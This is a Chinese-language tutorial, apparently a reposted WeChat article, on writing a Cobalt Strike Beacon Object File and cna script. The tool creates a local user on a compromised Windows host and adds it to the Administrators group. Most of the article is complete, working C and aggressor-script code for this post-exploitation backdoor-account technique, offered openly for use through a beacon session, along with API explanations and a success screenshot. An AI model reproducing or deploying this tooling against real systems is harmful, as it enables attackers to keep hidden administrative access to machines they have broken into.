> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/DWGy7_F8zWIHB0z3v0-ZuA)

#### 回顾

上节我们了解 CobaltStrike Bof 项目的构建以及常见的函数，比如如何去传递参数，判断当前线程是否是管理员权限等等。

那么我们本节课就来开始编写 Bof 项目。

还记的我们上节课讲的传递参数吗？我在做测试的时候发现直接使用 bof 去传递参数是无法成功的。

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpmticle74L92lKGwica5JPZcFdc6uPah0Mfh4pAxvlWOicGRDq8bQItmic8qWDjtrictvNggoJN9eicUhw/640?wx_fmt=png&from=appmsg)

所以我们需要配合 cna 脚本来使用。

#### 添加用户相关的 API 函数

那么我们首先来编写添加用户的 Bof 吧。

我们首先需要去了解两个关于添加用户的 Windows API 函数。

分别是 NetUserAdd 和 NetLocalGroupAddMembers 函数。

##### NetUserAdd

NetUserAdd 函数是用于 Windows 操作系统上添加用户账户的函数。

函数原型如下:

```
NET_API_STATUS NetUserAdd(
  LPCWSTR servername,
  DWORD   level,
  LPBYTE  buf,
  LPDWORD parm_err
);

```

servername 参数指向一个指定目标计算机名的 Unicode 字符串，如果为 NULL 的话，那么就在本地计算机上执行该函数。

level 指向的是信息的级别，常用的级别为 1 或 2，他们分别对应 `USER_INFO_1` 和 `USER_INFO_2`结构。

buf 参数指向一个包含用户信息的缓冲区，缓冲区的格式是由 level 参数来决定的。

parm_err 参数指向一个返回错误索引的变量，如果此参数为空的话，并且函数返回 ERROR_INVALID_PARAMETER，则无法确定那个参数无效。

如果函数执行成功的话，那么就返回 NERR_Success，否则返回错误信息。

##### NetLocalGroupAddMembers

NetLocalGroupAddMembers 函数用于将用户添加到本地组。

函数原型如下:

```
NET_API_STATUS NetLocalGroupAddMembers(
  LPCWSTR servername,
  LPCWSTR groupname,
  DWORD   level,
  LPBYTE  buf,
  DWORD   totalentries
);

```

servername 参数指向一个指定目标计算机名的 Unicode 字符串，如果为 NULL 的话，那么就在本地计算机上执行该函数。

groupname 参数指向一个包含本地组名称的 Unicode 字符串。

level 参数指定的是信息的级别，常用的级别为 0 和 3，他们分别对应 `LOCALGROUP_MEMBERS_INFO_0` 和 `LOCALGROUP_MEMBERS_INFO_3` 结构。

buf 参数指向一个包含用户信息的缓冲区，缓冲区的格式是由 level 参数来决定的。

totalentries 指向的是缓冲区中的成员数量。

#### 编写 Bof

那么我们接下来就开始去编写 Bof 了。

那么我们回顾一下，当时如果我们想去或者到 NT API 中的一些函数并调用的话，我们是不是通过 GetModuleHandleA 来获取到模块的基址，然后通过 GetProcAddress 函数来获取到函数的基址。

我们当时是不是还定义了目标函数的原型对吧。

那么编写 Bof 也是一样的，我们首先需要去定义要使用的 Windows API 函数的原型。

那么定义原型就非常简单了，我们只需要去参考 beacon.h 头文件中的定义方式即可。

如下定义 NetUserAdd 和 NetLocalGroupAddMembers 函数的原型。

```
typedef DWORD NET_API_STATUS;
DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetUserAdd(LPWSTR, DWORD, PBYTE, PDWORD);
DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetLocalGroupAddMembers(LPCWSTR, LPCWSTR, DWORD, PBYTE, DWORD);

```

我们来解释一下这些代码。

DECLSPEC_IMPORT 宏告诉编译器函数或变量是从 DLL 中导入的，在这里的话 NetUserAdd 函数是从 NETAPI32.DLL 中导入的。

NET_API_STATUS 是在 Windows 头文件中定义的 typedef，他代表一个整数类型，用于 API 函数返回的状态，其中 NT_API_STATUS 通常表示与网络操作相关的成功或者失败。

NETAPI32$NetUserAdd 是函数在 NETAPI32.DLL 中的修饰名称。

其实上面的函数的声明是在 CobaltStrike 中定义的，用于去调用 NetUserAdd 和 NetLocalGroupAddMembers 函数。

那么函数的原型定义完之后，我们首先去判断当前的线程是否是管理员的权限，因为我们要添加用户，需要管理员的权限。

```
if (!BeaconIsAdmin()) {
        BeaconPrintf(CALLBACK_OUTPUT, "当前线程不是管理员的权限");
        return;
 }

```

紧接着我们就需要去接收参数了，因为我们需要传递用户名和密码。

首先我们需要定义 datap 结构，然后通过 BeaconDataParse 来创建解析器。

```
datap parser;
BeaconDataParse(&parser, args, len);

```

然后使用 BeaconDataExtract 函数来解析传递过来的参数。

```
wchar_t * username = (wchar_t *)BeaconDataExtract(&parser, NULL);
wchar_t * password; = (wchar_t *)BeaconDataExtract(&parser, NULL);

```

获取到账号和密码之后就可以来进行使用了。

紧接着我们要使用 NetUserAdd 函数的话，我们就需要去初始化 USER_INFO_1 结构。

```
USER_INFO_1 UserInfo;
UserInfo.usri1_name = username;
UserInfo.usri1_password = password;
UserInfo.usri1_priv = USER_PRIV_USER;
UserInfo.usri1_home_dir = NULL;
UserInfo.usri1_comment = NULL;
UserInfo.usri1_flags = UF_SCRIPT;
UserInfo.usri1_script_path = NULL;

```

然后就可以去调用 NETAPI32$NetUserAdd 函数了。

因为我们给的 level 参数的等级为 1，所以这也就是为什么我们上面去定义 USER_INFO_1 结构了。

```
DWORD dwLevel = 1;
DWORD dwError = 0;
NET_API_STATUS nStatus = NETAPI32$NetUserAdd(
        NULL,
        dwLevel,
        (LPBYTE)&UserInfo,
        &dwError
    );

```

然后我们就需要将用户添加的目标的管理员组中。

首先我们需要定义的是 NetLocalGroupAddMembers 的第二个参数，也就是你要添加到那个组中，一般我们会添加到 administrator 组中。

然后就是第三个参数也就是信息的等级，我们给定 3 等级即可，等级 3 对应的就是 LOCALGROUP_MEMBERS_INFO_3 结构，所以我们需要去定义 LOCALGROUP_MEMBERS_INFO_3 结构。

```
LOCALGROUP_MEMBERS_INFO_3 accountName;
accountName.lgrmi3_domainandname = UserInfo.usri1_name;
NET_API_STATUS aStatus;
aStatus = NETAPI32$NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&accountName, 1);

```

这样其实就可以了。

完整代码如下:

```
#include <windows.h>
#include <stdio.h>
#include <lm.h>
#include "beacon.h"
typedef DWORD NET_API_STATUS;
DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetUserAdd(LPWSTR, DWORD, PBYTE, PDWORD);
DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetLocalGroupAddMembers(LPCWSTR, LPCWSTR, DWORD, PBYTE, DWORD);
void go(char* args, int len) {
    if (!BeaconIsAdmin()) {
        BeaconPrintf(CALLBACK_OUTPUT, "当前线程不是管理员的权限");
        return;
    }
    datap parser;
    BeaconDataParse(&parser, args, len);
    wchar_t* username = (wchar_t*)BeaconDataExtract(&parser, NULL);
    wchar_t* password = (wchar_t*)BeaconDataExtract(&parser, NULL);
    if (username == NULL || password == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "账户和密码为空\n");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "username: %ls\n", username);
    BeaconPrintf(CALLBACK_OUTPUT, "password: %ls\n", password);
    USER_INFO_1 UserInfo;
    UserInfo.usri1_name = username;
    UserInfo.usri1_password = password;
    UserInfo.usri1_priv = USER_PRIV_USER;
    UserInfo.usri1_home_dir = NULL;
    UserInfo.usri1_comment = NULL;
    UserInfo.usri1_flags = UF_SCRIPT;
    UserInfo.usri1_script_path = NULL;
    DWORD dwLevel = 1;
    DWORD dwError = 0;
    NET_API_STATUS status = NETAPI32$NetUserAdd(
        NULL,
        dwLevel,
        (LPBYTE)&UserInfo,
        &dwError
    );
    if (status == NERR_Success) {
        BeaconPrintf(CALLBACK_OUTPUT, "Success", username);
    }
    else {
        BeaconPrintf(CALLBACK_OUTPUT, "Error", status);
    }
    LOCALGROUP_MEMBERS_INFO_3 accountName;
    accountName.lgrmi3_domainandname = UserInfo.usri1_name;
    NET_API_STATUS aStatus;
    aStatus = NETAPI32$NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&accountName, 1);
    if (aStatus == NERR_Success) {
        BeaconPrintf(CALLBACK_OUTPUT, "成功将用户添加到管理员组中", NULL);
    }
    else {
        BeaconPrintf(CALLBACK_OUTPUT, "添加管理员失败", NULL);
    }
}

```

#### 编写 cna 文件

紧接着我们就需要去编写 cna 文件了。

之前我在 b 站发过一期 cna 文件的编写。

如下:

```
https://www.bilibili.com/video/BV1JU4y167KG/?spm_id_from=333.999.0.0

```

有空的话大家可以看一下。

首先我们需要注册一个命令，注册命令的意思就是在 CobaltStrike Beacon 控制台中，像 shell，run 这一类命令。

注册命令需要使用到 beacon_command_register。

```
beacon_command_register(
    "AddUserGroup", 
    "添加用户以及到管理员组中", 
    "Command: AddUserGroup <username> <password>"
);

```

我们在脚本管理器这里去加载即可。

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpmticle74L92lKGwica5JPZc0HkxH3D6MTguZ0fVse6wpt39icr2ic1SRgszE93Y0pxISVE1ssC5FT0g/640?wx_fmt=png&from=appmsg)

紧接着我们就需要从 Beacon 控制台的命令行去获取到参数了。

这里的 alias 是定义命令的别名，也就是说当我们在 Beacon 命令行窗口去执行 AddUserGroup 命令的时候就会执行这个代码块中的代码。

```
alias AddUserGroup{
  $username = $2;
	$password = $3;
}

```

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpmticle74L92lKGwica5JPZcQsrLliaZwqs9S4C8yEvLatnmgDhbO1aVX0lrrBWSa52UVYZMlyScCcA/640?wx_fmt=png&from=appmsg)

接收到参数之后我们就要开始去读取 Bof 文件了。

这里需要使用到 script_resource 函数，script_resource 函数会去读取我们编写的 Bof 文件，然后返回一个文件句柄。

首先去声明局部变量。

```
local('$barch $handle $data $args');

```

然后调用 script_resource 函数来进行读取。

```
//获取当前系统的架构
$barch  = barch($1);
$handle = openf(script_resource("source. $+ $barch $+ .obj"));
$data = readb($handle, -1);
closef($handle);

```

这样的话读取的其实就是 souce.x86.obj 或 source.x64.obj

读取之后使用 bof_pack 函数将用户名和密码打包成 Bof 函数可以理解的格式，这里的 ZZ 表示两个字符串参数。

```
$args = bof_pack($1, "ZZ", $username, $password);

```

最后使用 beacon_inline_execute 函数来执行 Bof。

```
beacon_inline_execute($1, $data, "go", $args);

```

这里的 $1 表示回话的 ID，data 表示 Bof 的数据，go 表示入口点函数名，args 表示打包的参数。

完整代码如下:

```
beacon_command_register(
    "AddUserGroup", 
    "添加用户以及到管理员组中", 
    "Command: AddUserGroup <username> <password>"
);
alias AddUserGroup{
	local('$barch $handle $data $args');
	$username = $2;
	$password = $3;
	$barch  = barch($1);
        $handle = openf(script_resource("source. $+ $barch $+ .obj"));
	$data = readb($handle, -1);
	closef($handle);
	$args = bof_pack($1, "ZZ", $username, $password);
	beacon_inline_execute($1, $data, "go", $args);
}

```

紧接着我们将 souce.x64.obj 和 cna 文件放在同一个目录即可。

可以看到成功添加。

![](https://mmbiz.qpic.cn/mmbiz_png/ia1z64qxm2mpmticle74L92lKGwica5JPZcEsaQzia9EKbwA0zbpfQy9daXryicqUrN8hvGlJKsJzDuCnyDQtbspUiag/640?wx_fmt=png&from=appmsg)